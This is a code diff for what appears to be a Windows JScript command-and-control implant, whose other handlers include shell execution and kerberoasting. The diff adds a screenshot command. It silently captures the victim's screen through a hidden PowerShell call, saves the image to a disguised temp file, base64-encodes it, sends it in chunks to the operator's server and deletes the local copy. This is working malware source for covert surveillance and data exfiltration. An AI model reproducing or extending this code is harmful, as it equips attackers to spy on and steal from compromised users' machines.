@@ -410,6 +410,61 @@ var HANDLERS = {
         if (stderr.length) out += "\n[stderr]\n" + stderr;
         return { user_output: out || "(no output)", completed: true };
     },
+    "screenshot": function (task) {
+        var tempPath = wshell.ExpandEnvironmentStrings("%TEMP%") + "\\~ss" + Math.floor(Math.random() * 99999) + ".png";
+        var psCmd = 'powershell.exe -NoProfile -NonInteractive -Command "' +
+            'Add-Type -AssemblyName System.Windows.Forms;' +
+            'Add-Type -AssemblyName System.Drawing;' +
+            '$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;' +
+            '$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);' +
+            '$g=[System.Drawing.Graphics]::FromImage($bmp);' +
+            '$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);' +
+            '$g.Dispose();' +
+            "$bmp.Save('" + tempPath + "',[System.Drawing.Imaging.ImageFormat]::Png);" +
+            '$bmp.Dispose()"';
+        var exec = wshell.Exec(psCmd);
+        while (exec.Status === 0) WScript.Sleep(100);
+        if (!fso.FileExists(tempPath)) {
+            var err = "";
+            while (!exec.StdErr.AtEndOfStream) err += exec.StdErr.ReadLine() + "\n";
+            return { user_output: "screenshot failed: " + (err || "no output file"), completed: true, status: "error" };
+        }
+        var rs = new ActiveXObject("ADODB.Stream");
+        rs.Type = 1; rs.Open(); rs.LoadFromFile(tempPath);
+        var fileSize = rs.Size;
+        var bytes = rs.Read(); rs.Close();
+        var xml = new ActiveXObject("MSXML2.DOMDocument");
+        var node = xml.createElement("b64");
+        node.dataType = "bin.base64";
+        node.nodeTypedValue = bytes;
+        var encoded = node.text.replace(/\r?\n/g, "");
+        var chunkSize = 512000;
+        var totalChunks = Math.ceil(encoded.length / chunkSize) || 1;
+        var initResp = postMessage({
+            action: "post_response",
+            responses: [{
+                task_id: task.id,
+                download: { total_chunks: totalChunks, full_path: tempPath, is_screenshot: true }
+            }]
+        });
+        if (!initResp || !initResp.responses || !initResp.responses.length || !initResp.responses[0].file_id) {
+            try { fso.DeleteFile(tempPath); } catch (e) {}
+            return { user_output: "screenshot transfer init failed", completed: true, status: "error" };
+        }
+        var fileId = initResp.responses[0].file_id;
+        for (var c = 0; c < totalChunks; c++) {
+            var chunk = encoded.substr(c * chunkSize, chunkSize);
+            postMessage({
+                action: "post_response",
+                responses: [{
+                    task_id: task.id,
+                    download: { file_id: fileId, chunk_num: c + 1, chunk_data: chunk }
+                }]
+            });
+        }
+        try { fso.DeleteFile(tempPath); } catch (e) {}
+        return { user_output: "screenshot captured (" + fileSize + " bytes)", completed: true };
+    },
     "kerberoast": function (task) {
         var targetSpn = getParam(task, "spn");
         var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
